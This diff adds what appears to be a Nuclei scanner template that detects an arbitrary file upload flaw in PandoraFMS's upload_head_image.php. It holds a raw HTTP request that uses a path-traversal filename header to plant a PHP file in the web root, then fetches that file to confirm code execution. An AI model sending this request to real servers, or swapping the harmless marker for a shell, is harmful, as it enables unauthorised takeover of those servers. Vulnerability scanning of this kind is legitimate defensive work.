@@ -1,0 +1,42 @@
+id: pandorafms-file-upload
+info:
+  name: PandoraFMS upload_head_image.php Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    PandoraFMS upload_head_image.php contains an unauthorized file upload vulnerability. Attackers can upload malicious Trojan horses to obtain server permissions.
+  reference:
+    - https://3sjay.github.io/2023/01/06/pandoraFMS-Pre-Auth-RCE.html
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /pandora_console/enterprise/meta/general/upload_head_image.php?up=true HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        UP-FILENAME: ../../../../../../../../../../var/www/html/pandora_console/extensions/{{rand_filename}}.php
+
+        <?php echo md5(233);unlink(__FILE__);?>
+    extractors:
+      - type: regex
+        name: rand_filename
+        internal: true
+        regex:
+          - "([a-f0-9]{6})"
+    matchers:
+      - type: status
+        status:
+          - 200
+    stop-at-first-match: true
+  - raw:
+      - |
+        GET /pandora_console/extensions/{{rand_filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+      - type: status
+        status:
+          - 200
+    matchers-condition: and
